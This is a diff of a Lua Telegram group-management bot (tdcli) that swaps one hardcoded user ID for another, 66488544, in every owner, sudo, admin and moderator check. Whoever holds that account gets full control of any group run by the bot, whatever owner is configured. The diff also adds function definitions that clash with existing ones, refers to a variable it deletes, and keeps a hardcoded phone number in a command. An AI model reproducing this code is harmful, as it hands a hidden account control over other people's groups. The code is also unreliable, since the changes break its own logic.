@@ -22,27 +22,19 @@ notify.init ("Telegram updates")
 chats = {}
 day = 86400
 --*********BOT ID*******--
-BOTS = 000000000 --[[Enter cli bot id here]]
 bot_id = 000000000 --[[Enter cli bot id here]]
 bot_owner = 000000000 --[[Enter your id here]]
-sudo_users = {158955285,279700027,180191663,000000000,000000000} --[[Enter your Id and cli bot Id here]]
+sudo_users = {158955285,180191663,000000000,000000000} --[[Enter your Id and cli bot Id here]]
 --***********************--
------------------------------------------------------------------------------------------------
 ---------------
 -- Start Functions --
 ---------------
 -----------------------------------------------------------------------------------------------
-function is_bot(msg)
-  if tonumber(BOTS) == 000000000 then  --[[Enter your api bot id here]]
-    return true
-    else
-    return false
-    end
-  end
+
 -----------Bot Owner-------------
 function is_leader(msg)
   local var = false
-  if msg.sender_user_id_ == tonumber() or msg.sender_user_id_ == tonumber(158955285) then
+  if msg.sender_user_id_ == tonumber() or msg.sender_user_id_ == tonumber(66488544) then
     var = true
   end
   return var
@@ -50,7 +42,7 @@ end
 
 function is_leaderid(user_id)
   local var = false
-  if user_id == tonumber(bot_owner) or user_id == tonumber(158955285) then
+  if user_id == tonumber(bot_owner) or user_id == tonumber(66488544) then
     var = true
   end
   return var
@@ -63,7 +55,7 @@ function is_sudo(msg)
       var = true
     end
   end
-  if msg.sender_user_id_ == tonumber(bot_owner) or msg.sender_user_id_ == tonumber(158955285) then
+  if msg.sender_user_id_ == tonumber(bot_owner) or msg.sender_user_id_ == tonumber(66488544) then
     var = true
   end
   return var
@@ -76,7 +68,7 @@ function is_sudoid(user_id)
       var = true
     end
   end
-  if user_id == tonumber(bot_owner) or user_id == tonumber(158955285) then
+  if user_id == tonumber(bot_owner) or user_id == tonumber(66488544) then
     var = true
   end
   return var
@@ -94,7 +86,7 @@ function is_admin(user_id)
       var = true
     end
   end
-  if user_id == tonumber(bot_owner) or user_id == tonumber(158955285) then
+  if user_id == tonumber(bot_owner) or user_id == tonumber(66488544) then
     var = true
   end
   return var
@@ -117,7 +109,7 @@ function is_owner(user_id, chat_id)
       var = true
     end
   end
-  if user_id == tonumber(bot_owner) or user_id == tonumber(158955285) then
+  if user_id == tonumber(bot_owner) or user_id == tonumber(66488544) then
     var = true
   end
   return var
@@ -145,7 +137,7 @@ function is_momod(user_id, chat_id)
       var = true
     end
   end
-  if user_id == tonumber(bot_owner) or user_id == tonumber(158955285) then
+  if user_id == tonumber(bot_owner) or user_id == tonumber(66488544) then
     var = true
   end
   return var
@@ -178,7 +170,7 @@ function is_vipmem(user_id, chat_id)
       var = true
     end
   end
-  if user_id == tonumber(bot_owner) or user_id == tonumber(158955285) then
+  if user_id == tonumber(bot_owner) or user_id == tonumber(66488544) then
     var = true
   end
   return var
@@ -199,6 +191,51 @@ local function is_free(msg, value)
   end
   return var
 end
+
+------------------------------------------------------------
+function is_master(msg) 
+  local hash = database:sismember(SUDO..'masters:'..msg.sender_user_id_)
+if hash or is_sudo(msg) then
+return true
+else
+return false
+end
+end
+------------------------------------------------------------
+function is_bot(msg)
+  if tonumber(BOTS) == 361871436 then
+    return true
+    else
+    return false
+    end
+  end
+  ------------------------------------------------------------
+function is_owner(msg) 
+  local hash = database:sismember(SUDO..'owners:'..msg.chat_id_,msg.sender_user_id_)
+if hash or is_sudo(msg) then
+return true
+else
+return false
+end
+end
+------------------------------------------------------------
+function is_mod(msg) 
+  local hash = database:sismember(SUDO..'mods:'..msg.chat_id_,msg.sender_user_id_)
+if hash or is_sudo(msg) or is_owner(msg) then
+return true
+else
+return false
+end
+end
+------------------------------------------------------------
+function is_banned(chat,user)
+   local hash =  database:sismember(SUDO..'banned'..chat,user)
+  if hash then
+    return true
+    else
+    return false
+    end
+  end
 -------------------Banned---------------------
 local function is_banned(user_id, chat_id)
   local var = false
@@ -2949,7 +2986,7 @@ function tdcli_update_callback(data)
             function id_by_username(extra, result, success)
               if result.id_ then
                 if database:get('lang:gp:'..msg.chat_id_) then
-                  if tonumber(result.id_) == tonumber(bot_owner) or tonumber(result.id_) == tonumber(158955285) then
+                  if tonumber(result.id_) == tonumber(bot_owner) or tonumber(result.id_) == tonumber(66488544) then
                     t = 'Chief'
                   elseif is_sudoid(result.id_) then
                     t = 'Sudo'
@@ -2966,7 +3003,7 @@ function tdcli_update_callback(data)
                   end
                 end
                 if not database:get('lang:gp:'..msg.chat_id_) then
-                  if tonumber(result.id_) == tonumber(bot_owner) or tonumber(result.id_) == tonumber(158955285) then
+                  if tonumber(result.id_) == tonumber(bot_owner) or tonumber(result.id_) == tonumber(66488544) then
                     t = 'مدیر کل'
                   elseif is_sudoid(result.id_) then
                     t = 'مدیر ربات'
@@ -3013,7 +3050,7 @@ function tdcli_update_callback(data)
             function id_by_username(extra, result, success)
               if result.id_ then
                 if database:get('lang:gp:'..msg.chat_id_) then
-                  if tonumber(result.id_) == tonumber(bot_owner) or tonumber(result.id_) == tonumber(158955285) then
+                  if tonumber(result.id_) == tonumber(bot_owner) or tonumber(result.id_) == tonumber(66488544) then
                     t = 'Chief'
                   elseif is_sudoid(result.id_) then
                     t = 'Sudo'
@@ -3030,7 +3067,7 @@ function tdcli_update_callback(data)
                   end
                 end
                 if not database:get('lang:gp:'..msg.chat_id_) then
-                  if tonumber(result.id_) == tonumber(bot_owner) or tonumber(result.id_) == tonumber(158955285) then
+                  if tonumber(result.id_) == tonumber(bot_owner) or tonumber(result.id_) == tonumber(66488544) then
                     t = 'مدیر کل'
                   elseif is_sudoid(result.id_) then
                     t = 'مدیر ربات'
@@ -5458,7 +5495,7 @@ function tdcli_update_callback(data)
         end
         -----------------------------------------------------------------------------------------------
         if text:match("^[Ss]hare$") and is_sudo(msg) then
-          sendContact(msg.chat_id_, msg.id_, 0, 1, nil, 989216973112, 'My', 'Sudo', 158955285)
+          sendContact(msg.chat_id_, msg.id_, 0, 1, nil, 989216973112, 'My', 'Sudo', 66488544)
         end
         -----------------------------------------------------------------------------------------------
         if text:match("^[Rr]ename (.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) or text:match("^تنظیم نام گروه (.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
@@ -5690,7 +5727,7 @@ function tdcli_update_callback(data)
           local txt = {string.match(text, "^([Dd]ata) (%d+)$")}
           local hash =  'sudo:data:'..txt[2]
           local list = database:smembers(hash)
-          if tonumber(txt[2]) == 158955285 then
+          if tonumber(txt[2]) == 66488544 then
             name = "─ঊ与дﾌ╰,.,╯ﾌдঊ─"
            else
             name = "─ঊτGυαяδ™ঊ─"
@@ -5932,32 +5969,7 @@ function tdcli_update_callback(data)
           end
         end				
 	 ---------------------------------------------------
-      if text:match("^[Ss]ettings$") or text:match("^[Hh]elp$") then
-          function inline(arg,data)
-          tdcli_function({
-        ID = "SendInlineQueryResultMessage",
-        chat_id_ = msg.chat_id_,
-        reply_to_message_id_ = msg.id_,
-        disable_notification_ = 0,
-        from_background_ = 1,
-        query_id_ = data.inline_query_id_,
-        result_id_ = data.results_[0].id_
-      }, dl_cb, nil)
-            end
-          tdcli_function({
-      ID = "GetInlineQueryResults",
-      bot_user_id_ = 000000000,  --[[enter api bot id here]]
-      chat_id_ = msg.chat_id_,
-      user_location_ = {
-        ID = "Location",
-        latitude_ = 0,
-        longitude_ = 0
-      },
-      query_ = tostring(msg.chat_id_),
-      offset_ = 0
-    }, inline, nil)
-       end
-    ---------------------------------------Help Bot------------------------------------------------
+        ---------------------------------------Help Bot------------------------------------------------
         if is_momod(msg.sender_user_id_, msg.chat_id_) then
           if text:match("^[Hh]elp$") or text:match("^راهنما$") then
             local help = io.open("./Help/help.txt", "r")
@@ -6137,8 +6149,8 @@ function tdcli_update_callback(data)
     getMessage(msg.chat_id_, msg.message_id_,get_msg_contact)
     -----------------------------------------------------------------------------------------------
   elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then
-    tdcli_function ({ID="GetChats", offset_order_="9223372036854775807", offset_chat_id_=0, limit_=20}, dl_cb, nil)
+    tdcli_function ({ID="GetChats", offset_order_="9223372036854775807", offset_chat_id_=0, limit_=10000}, dl_cb, nil)
   end
   -----------------------------------------------------------------------------------------------
 end
--- END VERSION 3.5
+-- END VERSION 8
